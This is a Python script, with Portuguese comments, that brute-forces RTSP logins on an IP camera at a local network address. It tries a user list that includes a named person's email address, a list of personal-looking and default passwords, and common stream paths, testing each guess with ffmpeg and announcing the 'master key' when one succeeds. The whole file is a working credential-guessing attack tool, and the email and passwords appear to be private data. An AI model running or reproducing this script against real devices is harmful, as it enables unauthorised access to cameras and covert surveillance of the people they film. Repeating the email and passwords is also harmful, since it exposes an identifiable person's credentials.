import subprocess
import urllib.parse
import sys

# Matriz de Alvos
IP = "192.168.3.71"
USERS = ["admin", "tatianapatriciamartinezospino@hotmail.com"]
PASSWORDS = [
    "Ol1ve1r@", 
    "##samuel283@@", 
    "123456", 
    "admin", 
    "", 
    "888888", 
    "12345", 
    "Ol1ve1ra@", 
    "Ol1veira@"
]

PATHS = [
    "/live/ch0",
    "/stream1",
    "/cam/realmonitor?channel=1&subtype=0",
    "/Streaming/Channels/101",
    "/user={user}&password={password}&channel=1&stream=0.sdp"
]

FFPROBE_PATH = "/opt/homebrew/bin/ffmpeg"

def test_combination(user, password, path):
    # Encode password for URL
    encoded_pass = urllib.parse.quote(password)
    encoded_user = urllib.parse.quote(user)
    
    # Resolve dynamic paths
    final_path = path.format(user=encoded_user, password=encoded_pass)
    
    url = f"rtsp://{encoded_user}:{encoded_pass}@{IP}:554{final_path}"
    
    print(f"🔎 Testando: {user}:{'*' * len(password)} @ {final_path}")
    
    # ffprobe command to check connection without downloading stream
    cmd = [
        FFPROBE_PATH,
        "-rtsp_transport", "tcp", # iCSee costuma usar TCP
        "-i", url,
        "-t", "1",
        "-f", "null",
        "-"
    ]
    
    try:
        # Timeout de 5 segundos para cada tentativa
        result = subprocess.run(cmd, capture_output=True, timeout=5)
        if result.returncode == 0:
            return url
    except Exception:
        pass
    return None

if __name__ == "__main__":
    print("🚀 INICIANDO OPERAÇÃO QUEBRA-CÓDIGO (0.0.7)")
    print("-" * 50)
    
    found = False
    for password in PASSWORDS:
        for user in USERS:
            for path in PATHS:
                winner = test_combination(user, password, path)
                if winner:
                    print("\n" + "!" * 50)
                    print(f"✅ SUCESSO! CHAVE MESTRE ENCONTRADA:")
                    print(f"🔗 URL: {winner}")
                    print("!" * 50)
                    found = True
                    break
            if found: break
        if found: break

    if not found:
        print("\n❌ Nenhuma combinação funcional encontrada na matriz atual.")
